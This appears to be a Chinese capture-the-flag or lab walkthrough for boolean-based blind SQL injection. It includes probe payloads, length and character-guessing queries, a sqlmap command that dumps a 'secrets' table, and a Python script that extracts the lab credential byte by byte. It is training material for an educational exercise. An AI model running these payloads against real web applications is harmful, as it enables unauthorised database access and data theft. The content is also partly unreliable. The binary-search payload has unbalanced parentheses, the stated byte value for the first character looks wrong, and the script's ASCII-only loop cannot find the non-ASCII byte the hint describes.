思路提示

布尔盲注的核心是页面只返回"存在"或"不存在"两种结果，没有数据回显也没有报错。思路：构造 and 条件，让条件的真假决定页面返回哪种结果，从而逐位猜出数据。先用 and 1=1 / and 1=2 确认真假差异，再用 length() 猜长度，ascii(substr(...,1,1)) 逐位猜字符。建议配合 Burp Intruder 或 Python 脚本自动化。

详细解题过程（点击展开）
真/假探针（返回"存在"即为真）：
?name=admin' and 1=1-- - → 存在
?name=admin' and 1=2-- - → 不存在
探通关凭证长度：
?name=admin' and length((select secret from secrets limit 1))=10-- -
猜第 1 个字符（ASCII 值）：
?name=admin' and ascii(substr((select secret from secrets limit 1),1,1))=229-- -（229 = 恭 的首字节）
二分法加速：
?name=admin' and ascii(substr((select secret from secrets limit 1),1,1)>200-- -
确定首字符后逐个往后推：把 substr(...,1,1) 的第 2 个参数依次改成 2、3、4……
sqlmap 自动化：
sqlmap -u "{{SITE}}/modules/sqli/blind.php?name=admin" --technique=B -D bafanglab -T secrets --dump --batch
注意：参数为单引号包裹，payload 末尾必须有 -- -；一旦语法错误页面会显示"查询异常"，这不算"不存在"。
Python 脚本（复制到本地直接跑）： 
import requests

url = "{{SITE}}/modules/sqli/blind.php"
secret = ""
for pos in range(1, 40):
    for code in range(32, 127):
        payload = "admin' and ascii(substr((select secret from secrets limit 1),%d,1))=%d-- -" % (pos, code)
        r = requests.get(url, params={"name": payload}, timeout=10)
        # 真值页面会带 var(--success) 样式，"不存在"页面带 var(--danger)
        if "var(--success)" in r.text:
            secret += chr(code)
            print(pos, secret)
            break
    if len(secret) >= 10:
        break
print("通关凭证:", secret)
